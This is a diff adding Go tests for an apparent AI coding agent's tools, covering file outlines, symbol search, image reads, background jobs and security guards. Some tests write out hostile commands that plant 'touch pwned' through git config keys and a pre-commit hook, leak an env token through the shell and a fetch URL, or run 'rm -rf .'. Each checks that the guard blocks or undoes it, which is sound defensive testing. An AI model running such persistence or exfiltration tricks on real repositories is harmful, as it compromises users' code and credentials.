@@ -1,13 +1,17 @@
 package tool
 
 import (
+	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
+	"image"
+	"image/png"
 	"net"
 	"net/http"
 	"net/http/httptest"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"sync"
@@ -518,5 +522,314 @@ func TestPlanMode(t *testing.T) {
 	}
 	if _, err := call(t, bashTool, e, `{"cmd":"rm -rf ."}`); err == nil {
 		t.Fatal("risky command allowed in plan mode")
+	}
+}
+
+func TestOutlineAndSymbol(t *testing.T) {
+	e := env(t)
+	os.MkdirAll(filepath.Join(e.Root, "pkg"), 0o755)
+	os.WriteFile(filepath.Join(e.Root, "pkg", "a.go"), []byte("package pkg\n\ntype Svc struct{}\n\nfunc (s *Svc) Start() error {\n\treturn nil\n}\n"), 0o644)
+	os.WriteFile(filepath.Join(e.Root, "b.py"), []byte("class Svc:\n    def start(self):\n        pass\n"), 0o644)
+	os.WriteFile(filepath.Join(e.Root, "notes.md"), []byte("# Svc"), 0o644)
+
+	out, err := call(t, readTool, e, `{"path":"pkg/a.go","outline":true}`)
+	if err != nil || !strings.Contains(out, "5: func (s *Svc) Start() error") || strings.Contains(out, "return nil") {
+		t.Fatalf("file outline: %q %v", out, err)
+	}
+	// An outline is not a full read: overwriting still needs a real read.
+	if _, err := call(t, editTool, e, `{"path":"pkg/a.go","new":"package pkg\n"}`); err == nil {
+		t.Fatal("outline must not count as having read the file")
+	}
+	out, _ = call(t, readTool, e, `{"path":".","outline":true}`)
+	if !strings.Contains(out, "== b.py (4 lines)\n1: class Svc") || !strings.Contains(out, "== pkg/a.go") || strings.Contains(out, "notes.md") || strings.Contains(out, "def start") {
+		t.Fatalf("dir outline: %q", out)
+	}
+	out, _ = call(t, searchTool, e, `{"symbol":"Svc.Start"}`)
+	if strings.TrimSpace(out) != "pkg/a.go:5: func (s *Svc) Start() error" {
+		t.Fatalf("symbol: %q", out)
+	}
+	out, _ = call(t, searchTool, e, `{"symbol":"Svc"}`)
+	if !strings.Contains(out, "b.py:1: class Svc") || !strings.Contains(out, "pkg/a.go:3: type Svc struct") {
+		t.Fatalf("symbol Svc: %q", out)
+	}
+	if _, err := call(t, readTool, e, `{"path":"notes.md","outline":true}`); err == nil {
+		t.Fatal("unsupported outline should error")
+	}
+}
+
+func TestReadImage(t *testing.T) {
+	e := env(t)
+	var buf bytes.Buffer
+	png.Encode(&buf, image.NewRGBA(image.Rect(0, 0, 3, 2)))
+	os.WriteFile(filepath.Join(e.Root, "shot.png"), buf.Bytes(), 0o644)
+	os.WriteFile(filepath.Join(e.Root, "fake.png"), []byte("not an image at all"), 0o644)
+
+	out, err := call(t, readTool, e, `{"path":"shot.png"}`)
+	if err != nil || !strings.Contains(out, "cannot view images") {
+		t.Fatalf("no vision: %q %v", out, err)
+	}
+	e.Vision = true
+	ctx, imgs := WithImageSink(context.Background())
+	out, err = readTool.Run(ctx, e, json.RawMessage(`{"path":"shot.png"}`))
+	if err != nil || !strings.Contains(out, "image/png") || !strings.Contains(out, "3x2") {
+		t.Fatalf("vision read: %q %v", out, err)
+	}
+	if got := imgs(); len(got) != 1 || got[0].MediaType != "image/png" || !bytes.Equal(got[0].Data, buf.Bytes()) {
+		t.Fatalf("attached: %+v", got)
+	}
+	// A .png that is not an image is read as a file.
+	if out, _ := readTool.Run(ctx, e, json.RawMessage(`{"path":"fake.png"}`)); !strings.Contains(out, "not an image") {
+		t.Fatalf("fake png: %q", out)
+	}
+}
+
+func TestRefsTreeAndIndexCache(t *testing.T) {
+	e := env(t)
+	e.CodeCache = filepath.Join(t.TempDir(), "codemap.gob")
+	os.MkdirAll(filepath.Join(e.Root, "svc", "deep", "er"), 0o755)
+	os.WriteFile(filepath.Join(e.Root, "svc", "a.go"), []byte("package svc\n\nfunc Load() int { return 1 }\n\n// Load is documented here\nfunc Use() int {\n\treturn Load() + Loader()\n}\n"), 0o644)
+	os.WriteFile(filepath.Join(e.Root, "main.py"), []byte("from svc import Load\n\nclass App:\n    def run(self):\n        return Load()\n"), 0o644)
+	os.WriteFile(filepath.Join(e.Root, "svc", "deep", "er", "x.txt"), []byte("x"), 0o644)
+
+	out, err := call(t, searchTool, e, `{"refs":"Load"}`)
+	if err != nil || !strings.HasPrefix(out, "3 reference(s) in 2 file(s)") ||
+		!strings.Contains(out, "svc/a.go:7 [in Use]: return Load() + Loader()") ||
+		!strings.Contains(out, "main.py:5 [in App.run]: return Load()") ||
+		strings.Contains(out, "func Load") || strings.Contains(out, "documented") {
+		t.Fatalf("refs: %q %v", out, err)
+	}
+	if _, err := os.Stat(e.CodeCache); err != nil {
+		t.Fatal("index not cached on disk")
+	}
+	// A changed file is re-indexed; a fresh Env reuses the disk cache.
+	os.WriteFile(filepath.Join(e.Root, "svc", "b.go"), []byte("package svc\n\nfunc Extra() { Load() }\n"), 0o644)
+	e2 := &Env{Root: e.Root, CodeCache: e.CodeCache}
+	if out, _ := call(t, searchTool, e2, `{"refs":"Load"}`); !strings.Contains(out, "svc/b.go:3 [in Extra]") {
+		t.Fatalf("refs after change: %q", out)
+	}
+	if out, _ := call(t, searchTool, e2, `{"symbol":"Extra","path":"svc"}`); strings.TrimSpace(out) != "svc/b.go:3: func Extra()" {
+		t.Fatalf("symbol in subdir: %q", out)
+	}
+
+	out, err = call(t, readTool, e, `{"path":"."}`)
+	if err != nil || !strings.Contains(out, "svc/\n  deep/ (1 files)\n  a.go\n  b.go\nmain.py") {
+		t.Fatalf("tree: %q %v", out, err)
+	}
+}
+
+func TestSearchMemory(t *testing.T) {
+	e := env(t)
+	if out, _ := call(t, searchTool, e, `{"memory":"flaky test"}`); out != "(memory is off)" {
+		t.Fatalf("no recall: %q", out)
+	}
+	e.Recall = func(q string) string { return "hit for " + q }
+	if out, _ := call(t, searchTool, e, `{"memory":"flaky test"}`); out != "hit for flaky test" {
+		t.Fatalf("recall: %q", out)
+	}
+}
+
+func TestGitGuardAndEnvScrub(t *testing.T) {
+	e := env(t)
+	exec.Command("git", "init", "-q", e.Root).Run()
+	t.Setenv("SUPER_SECRET_TOKEN", "do-not-leak-this-value")
+	out, _ := call(t, bashTool, e, `{"cmd":"env | grep -c do-not-leak-this-value; true"}`)
+	if !strings.HasPrefix(strings.TrimSpace(out), "0") {
+		t.Fatalf("secret reached the shell: %q", out)
+	}
+	out, _ = call(t, bashTool, e, `{"cmd":"git config core.fsmonitor 'touch pwned' && printf '#!/bin/sh\ntouch pwned\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit && git config user.name tester"}`)
+	if !strings.Contains(out, "undid .git/config") || !strings.Contains(out, "new hook .git/hooks/pre-commit") {
+		t.Fatalf("guard report: %q", out)
+	}
+	cfg, _ := os.ReadFile(filepath.Join(e.Root, ".git", "config"))
+	if strings.Contains(string(cfg), "fsmonitor") {
+		t.Fatal("fsmonitor survived")
+	}
+	if _, err := os.Stat(filepath.Join(e.Root, ".git", "hooks", "pre-commit")); err == nil {
+		t.Fatal("hook survived")
+	}
+	// Harmless config changes stay.
+	out, _ = call(t, bashTool, e, `{"cmd":"git config user.email a@b.c"}`)
+	cfg, _ = os.ReadFile(filepath.Join(e.Root, ".git", "config"))
+	if strings.Contains(out, "undid") || !strings.Contains(string(cfg), "a@b.c") {
+		t.Fatalf("harmless change undone: %q", out)
+	}
+	if _, err := call(t, fetchTool, e, `{"url":"https://example.com/?t=do-not-leak-this-value"}`); err == nil || !strings.Contains(err.Error(), "credential") {
+		t.Fatalf("fetch exfil: %v", err)
+	}
+}
+
+func TestReadNonRegularAndLarge(t *testing.T) {
+	e := env(t)
+	if _, err := call(t, readTool, e, `{"path":"/dev/zero"}`); err == nil || !strings.Contains(err.Error(), "not a regular file") {
+		t.Fatalf("/dev/zero: %v", err)
+	}
+	big := filepath.Join(e.Root, "big.log")
+	f, _ := os.Create(big)
+	line := strings.Repeat("x", 99) + "\n"
+	for i := 0; i < 90000; i++ { // ~9 MB
+		f.WriteString(line)
+	}
+	f.WriteString("THE END\n")
+	f.Close()
+	out, err := call(t, readTool, e, `{"path":"big.log","offset":90001,"limit":5}`)
+	if err != nil || !strings.Contains(out, "lines 90001-90001 shown") || !strings.Contains(out, "THE END") {
+		t.Fatalf("large read: %q %v", out[:min(len(out), 200)], err)
+	}
+}
+
+func TestUnchangedRereadAndAtomicWrite(t *testing.T) {
+	e := env(t)
+	p := filepath.Join(e.Root, "a.txt")
+	os.WriteFile(p, []byte("one\ntwo\n"), 0o640)
+	first, _ := call(t, readTool, e, `{"path":"a.txt"}`)
+	again, _ := call(t, readTool, e, `{"path":"a.txt"}`)
+	if !strings.Contains(first, "one") || !strings.Contains(again, "unchanged since you read it") {
+		t.Fatalf("reread: %q", again)
+	}
+	if out, _ := call(t, readTool, e, `{"path":"a.txt","offset":2}`); !strings.Contains(out, "two") {
+		t.Fatal("a different range must be served")
+	}
+	if _, err := call(t, editTool, e, `{"path":"a.txt","old":"one","new":"uno"}`); err != nil {
+		t.Fatal(err)
+	}
+	if out, _ := call(t, readTool, e, `{"path":"a.txt"}`); !strings.Contains(out, "uno") {
+		t.Fatalf("changed file must be served in full: %q", out)
+	}
+	call(t, readTool, e, `{"path":"a.txt"}`)
+	e.ForgetReads()
+	if out, _ := call(t, readTool, e, `{"path":"a.txt"}`); !strings.Contains(out, "uno") {
+		t.Fatal("after ForgetReads the content must be served again")
+	}
+	st, _ := os.Stat(p)
+	if st.Mode().Perm() != 0o640 {
+		t.Fatalf("permissions not preserved: %v", st.Mode())
+	}
+	ents, _ := os.ReadDir(e.Root)
+	for _, en := range ents {
+		if strings.Contains(en.Name(), ".agentium-") {
+			t.Fatal("temporary file left behind")
+		}
+	}
+}
+
+func TestGitGuardVariants(t *testing.T) {
+	e := env(t)
+	exec.Command("git", "init", "-q", e.Root).Run()
+	cases := []string{
+		`printf '[core] fsmonitor = "touch pwned"\n' >> .git/config`,
+		`git config diff.external 'touch pwned'`,
+		`git config pager.log 'touch pwned'`,
+		`git config alias.st '!touch pwned'`,
+		`mkdir -p .git/modules/sub && printf 'ref: refs/heads/main\n' > .git/modules/sub/HEAD && printf '[core]\n' > .git/modules/sub/config && true`,
+	}
+	for _, c := range cases[:4] {
+		out, _ := call(t, bashTool, e, fmt.Sprintf(`{"cmd":%q}`, c))
+		if !strings.Contains(out, "undid") {
+			t.Errorf("%s: not undone: %q", c, out)
+		}
+	}
+	// Submodule git dirs are guarded too.
+	call(t, bashTool, e, fmt.Sprintf(`{"cmd":%q}`, cases[4]))
+	out, _ := call(t, bashTool, e, `{"cmd":"git config -f .git/modules/sub/config core.fsmonitor 'touch pwned'"}`)
+	if !strings.Contains(out, "undid .git/modules/sub/config") {
+		t.Errorf("submodule config: %q", out)
+	}
+	// A background change after the command returns is caught next time.
+	call(t, bashTool, e, `{"cmd":"(sleep 0.3; git config core.sshCommand 'touch pwned') >/dev/null 2>&1 &"}`)
+	time.Sleep(600 * time.Millisecond)
+	out, _ = call(t, bashTool, e, `{"cmd":"true"}`)
+	if !strings.Contains(out, "undid .git/config") {
+		t.Errorf("late change: %q", out)
+	}
+	cfg, _ := os.ReadFile(filepath.Join(e.Root, ".git", "config"))
+	if strings.Contains(string(cfg), "pwned") {
+		t.Fatalf("config still has a planted command:\n%s", cfg)
+	}
+	// Ordinary git work is untouched.
+	out, _ = call(t, bashTool, e, `{"cmd":"git remote add origin https://example.com/x.git && git config user.name T"}`)
+	if strings.Contains(out, "undid") {
+		t.Errorf("false positive: %q", out)
+	}
+}
+
+func TestReadFIFOAndLargeBinary(t *testing.T) {
+	e := env(t)
+	fifo := filepath.Join(e.Root, "pipe")
+	if err := syscallMkfifo(fifo); err != nil {
+		t.Skip("no mkfifo:", err)
+	}
+	done := make(chan error, 1)
+	go func() { _, err := call(t, readTool, e, `{"path":"pipe"}`); done <- err }()
+	select {
+	case err := <-done:
+		if err == nil || !strings.Contains(err.Error(), "not a regular file") {
+			t.Fatalf("fifo: %v", err)
+		}
+	case <-time.After(2 * time.Second):
+		t.Fatal("read on a FIFO hung")
+	}
+	big := make([]byte, 9<<20)
+	big[10] = 0
+	os.WriteFile(filepath.Join(e.Root, "blob.bin"), big, 0o644)
+	if out, _ := call(t, readTool, e, `{"path":"blob.bin"}`); !strings.HasPrefix(out, "(binary file") {
+		t.Fatalf("large binary: %.80q", out)
+	}
+}
+
+func TestSearchSkipsDotEnv(t *testing.T) {
+	e := env(t)
+	for _, n := range []string{".env.staging", ".envrc", ".env.example"} {
+		os.WriteFile(filepath.Join(e.Root, n), []byte("SECRET_VALUE=zzz-marker\n"), 0o644)
+	}
+	out, _ := call(t, searchTool, e, `{"pattern":"zzz-marker"}`)
+	if strings.Contains(out, ".env.staging") || strings.Contains(out, ".envrc") || !strings.Contains(out, ".env.example") {
+		t.Fatalf("search: %q", out)
+	}
+}
+
+func TestEditKeepsHardLinks(t *testing.T) {
+	e := env(t)
+	p := filepath.Join(e.Root, "a.txt")
+	os.WriteFile(p, []byte("one\n"), 0o644)
+	link := filepath.Join(e.Root, "b.txt")
+	if err := os.Link(p, link); err != nil {
+		t.Skip("no hard links:", err)
+	}
+	call(t, readTool, e, `{"path":"a.txt"}`)
+	if _, err := call(t, editTool, e, `{"path":"a.txt","old":"one","new":"two"}`); err != nil {
+		t.Fatal(err)
+	}
+	if b, _ := os.ReadFile(link); string(b) != "two\n" {
+		t.Fatalf("hard link split: %q", b)
+	}
+}
+
+func TestBackgroundJobs(t *testing.T) {
+	e := env(t)
+	defer e.KillJobs()
+	out, err := call(t, bashTool, e, `{"cmd":"echo ready; while read l; do echo got:$l; done","background":true}`)
+	if err != nil || !strings.Contains(out, "job 1 started (running)") || !strings.Contains(out, "ready") {
+		t.Fatalf("start: %q %v", out, err)
+	}
+	out, _ = call(t, bashTool, e, `{"job":1,"stdin":"hello\n"}`)
+	if !strings.Contains(out, "got:hello") || strings.Contains(out, "ready") {
+		t.Fatalf("stdin/new output only: %q", out)
+	}
+	out, _ = call(t, bashTool, e, `{}`)
+	if !strings.Contains(out, "job 1 · running") {
+		t.Fatalf("list: %q", out)
+	}
+	out, _ = call(t, bashTool, e, `{"job":1,"kill":true}`)
+	if !strings.Contains(out, "job 1 stopped") {
+		t.Fatalf("kill: %q", out)
+	}
+	if _, err := call(t, bashTool, e, `{"job":1,"stdin":"x\n"}`); err == nil {
+		t.Fatal("input to an exited job must fail")
+	}
+	// A short job finishes and reports its exit code.
+	call(t, bashTool, e, `{"cmd":"echo done; exit 3","background":true}`)
+	time.Sleep(300 * time.Millisecond)
+	if out, _ := call(t, bashTool, e, `{"job":2}`); !strings.Contains(out, "exited 3") {
+		t.Fatalf("exit: %q", out)
 	}
 }
